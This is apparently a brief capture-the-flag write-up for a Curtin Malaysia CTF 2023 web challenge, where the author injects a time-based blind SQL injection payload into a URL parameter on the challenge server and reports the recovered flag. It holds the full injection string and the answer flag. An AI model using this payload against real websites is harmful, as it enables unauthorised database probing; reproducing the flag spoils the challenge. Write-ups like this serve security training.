# Slow Down...

![image](https://github.com/6E3372/Curtin-Malaysia-CTF-2023/assets/129729880/b4586f40-f681-4500-9be5-7464803b74bf)

## Solution

For this challenge I got redirected to amin page soo I try my payload sqli time based error: ?%27XOR(if(now()=sysdate(),sleep(5*5),0))OR%27

I modified at link for this 
http://curtinctfmy-1946797319.ap-southeast-2.elb.amazonaws.com:8000/blindsqli.php?user=admin?%27XOR(if(now()=sysdate(),sleep(5*5),0))OR%27

and then the page delay about 20 seconds shows that the payload works and it has vulnerabilities soo after waiting we got the flag.

![image](https://github.com/6E3372/Curtin-Malaysia-CTF-2023/assets/129729880/3a27e841-f248-4778-a1ff-65607a8f962e)

## Flag

CURTIN_CTF{5l0wpOk3}
